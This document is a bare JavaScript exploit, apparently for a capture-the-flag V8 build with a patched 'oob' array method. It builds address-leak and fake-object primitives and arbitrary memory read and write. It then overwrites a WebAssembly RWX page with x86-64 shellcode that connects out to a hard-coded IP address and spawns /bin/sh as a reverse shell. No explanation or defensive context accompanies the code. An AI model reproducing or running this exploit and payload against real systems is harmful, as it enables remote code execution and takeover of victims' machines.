var a=[1.1];
var b=[a];
%DebugPrint(a);
%DebugPrint(b);

var float_map=a.oob();
var obj_map=b.oob();

var buf =new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);

function i2f(i)
{
    bigUint64[0] = i;
    return float64[0];
}

function f2i(f)
{
    float64[0] = f;
    return bigUint64[0];
}

function hex(i)
{
    return console.log("add:"+i.toString(16).padStart(16, "0"));
}

//leak obj add
function leak_add(obj){
    b[0] = obj;
    b.oob(float_map);
    var res = f2i(b[0])-1n;
    b.oob(obj_map);
    return res;
}

function fake_obj(add){
    a[0] = i2f(add+1n);
    a.oob(obj_map);
    var fake_obj = a[0];
    a.oob(float_map);
    return fake_obj;
}

function r(add){
    var fakeobj=[
        float_map,
        i2f(0n),
        i2f(add-0x10n+1n),
        i2f(0x300000000n),
    ];
    %DebugPrint(fakeobj);
    var k = leak_add(fakeobj);  
    hex(k);  
    var t = fake_obj(k+0xa0n);
    %DebugPrint(t);
    var res = f2i(t[0]);
    return res;
}

function w(add,val){
    var fakeobj=[
        float_map,
        i2f(0n),
        i2f(add-0x10n+1n),
        i2f(0x300000000n),
    ];
    var k = leak_add(fakeobj);    
    var t = fake_obj(k+0xa0n);
    t[0]=i2f(val);
    return;
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule,{});
var f = wasmInstance.exports.main;
var wasm_main=leak_add(f);
%DebugPrint(f);
var rwx=r(wasm_main-0x170n);
hex(rwx);


shellcode = [
    0x6a5f026a9958296an,
    0xb9489748050f5e01n,
    0x2d4f522d08520002n,
    0x6a5a106ae6894851n,
    0x485e036a050f582an,
    0x75050f58216aceffn,
    0x2fbb4899583b6af6n,
    0x530068732f6e6962n,
    0xe689485752e78948n,
    0x50fn
    ];

var data_buf = new ArrayBuffer(80);
var data_view = new DataView(data_buf);
var buf_backing_store_addr = leak_add(data_buf) + 0x20n;

w(buf_backing_store_addr, rwx);  
for (var i = 0; i < shellcode.length; i++)
    data_view.setBigUint64(8*i, shellcode[i], true);
f();

//hex(p);

%SystemBreak()

